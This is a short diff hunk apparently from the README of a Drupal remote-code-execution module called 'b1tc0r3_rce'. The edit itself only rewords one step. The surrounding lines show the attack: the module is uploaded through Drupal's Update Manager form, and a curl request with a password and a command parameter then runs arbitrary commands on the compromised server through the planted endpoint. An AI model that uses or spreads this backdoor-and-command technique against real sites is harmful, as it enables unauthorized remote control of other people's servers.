@@ -30,7 +30,7 @@ tar czf b1tc0r3_rce.tar.gz b1tc0r3_rce_module
 5. Left-click on the descrption of "Update Manager". I know, Drupals extension menu is not the most well designed.
 6. Click on "Configure".
 7. Upload the file through the web form that should not be open.
-8. Commands can now execute commands like this:
+8. You can now execute commands like this:
 
 ```bash
 curl 'http://ADDR/b1tc0r3_rce?proof=PASSWORD&command=COMMAND'
